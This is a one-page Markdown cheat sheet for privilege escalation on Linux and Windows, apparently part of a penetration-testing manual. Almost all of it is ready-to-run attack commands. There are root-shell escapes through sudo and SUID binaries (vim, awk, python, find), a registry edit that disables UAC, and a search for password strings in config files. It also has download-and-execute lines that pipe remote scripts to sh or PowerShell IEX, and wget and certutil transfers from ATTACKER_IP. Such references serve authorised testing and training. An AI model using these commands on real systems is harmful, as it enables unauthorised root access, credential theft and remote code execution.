# Privilege Escalation Quick Reference

One-page cheat sheet. For details, see the [full manual](README.md).

> ⚠️ **Legal Disclaimer**  
> Use only on systems you own or have permission to test.

---

## 🔥 Linux: Most Useful Commands

| Task | Command |
|------|---------|
| Current user | `whoami` |
| User info (UID, GID, groups) | `id` |
| All local users | `cat /etc/passwd` |
| Kernel version | `uname -a` |
| OS info | `cat /etc/os-release` |
| Find SUID binaries | `find / -perm -4000 -type f 2>/dev/null` |
| Find SGID binaries | `find / -perm -2000 -type f 2>/dev/null` |
| Sudo permissions | `sudo -l` |
| Cron jobs | `cat /etc/crontab` |
| Writable directories | `find / -writable -type d 2>/dev/null` |
| World-writable files | `find / -perm -2 -type f 2>/dev/null` |
| Environment variables | `env` |
| Active connections | `ss -tulpn` |
| Running processes | `ps aux` |
| Loaded kernel modules | `lsmod` |

---

## 🔥 Windows: Most Useful Commands

| Task | Command |
|------|---------|
| Current user | `whoami` |
| User privileges | `whoami /priv` |
| User groups | `whoami /groups` |
| All local users | `net user` |
| Administrators group | `net localgroup Administrators` |
| System info | `systeminfo` |
| OS version | `wmic os get caption,version` |
| Running services | `sc query` |
| Service config | `sc qc SERVICE_NAME` |
| Startup programs | `reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run` |
| Active connections | `netstat -ano` |
| Scheduled tasks | `schtasks /query /fo LIST /v` |
| Search files for "password" | `findstr /si password *.txt *.ini *.config` |
| Disable UAC (requires admin, reboot) | `reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f` |

---

## 🚀 Common Sudo Exploits (Linux)

| Sudo Entry | Exploit Command |
|------------|-----------------|
| `(ALL) NOPASSWD: ALL` | `sudo su` or `sudo -i` |
| `(ALL) NOPASSWD: /bin/bash` | `sudo /bin/bash` |
| `(ALL) NOPASSWD: /usr/bin/vim` | `sudo vim -c '!sh'` |
| `(ALL) NOPASSWD: /usr/bin/nano` | `sudo nano`, then `^R^X`, then `reset; sh 1>&0 2>&0` |
| `(ALL) NOPASSWD: /usr/bin/less` | `sudo less`, then `!sh` |
| `(ALL) NOPASSWD: /usr/bin/awk` | `sudo awk 'BEGIN {system("/bin/sh")}'` |
| `(ALL) NOPASSWD: /usr/bin/python*` | `sudo python -c 'import pty;pty.spawn("/bin/sh")'` |
| `(ALL) NOPASSWD: /usr/bin/gcc` | `sudo gcc -wrapper /bin/sh,-s` |

---

## 📊 SUID Binary Exploits (Linux)

| Binary | Exploit Command |
|--------|-----------------|
| `find` | `find / -exec /bin/sh \; -quit` |
| `bash` | `bash -p` |
| `less` / `more` | Run binary, then `!sh` |
| `vim` | `vim -c ':!/bin/sh'` |
| `nano` | `nano`, then `^R^X`, then `reset; sh 1>&0 2>&0` |
| `awk` | `awk 'BEGIN {system("/bin/sh")}'` |
| `perl` | `perl -e 'exec "/bin/sh";'` |
| `python` | `python -c 'import pty;pty.spawn("/bin/sh")'` |

---

## 🔑 One-Liner Enumeration Scripts

| OS | Command |
|----|---------|
| **Linux (LinPEAS)** | `curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh \| sh` |
| **Linux (Linux Smart Enumeration)** | `curl -L https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh \| sh` |
| **Windows (WinPEAS)** | `powershell -exec bypass -c "Invoke-WebRequest https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEAS.exe -OutFile winPEAS.exe; ./winPEAS.exe"` |
| **Windows (PowerUp)** | `powershell -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1'); Invoke-AllChecks"` |

---

## 🔧 Quick Transfer Methods

| From | Method | Command |
|------|--------|---------|
| **Linux to Linux** | Python HTTP server | `python3 -m http.server 8000` (attacker), `wget http://ATTACKER_IP:8000/file` (target) |
| **Windows to Windows** | PowerShell WebClient | `(New-Object Net.WebClient).DownloadFile("http://ATTACKER_IP:8000/file", "file")` |
| **Windows to Windows** | certutil | `certutil -urlcache -f http://ATTACKER_IP:8000/file file` |

---

📖 [Back to Full Manual](README.md)
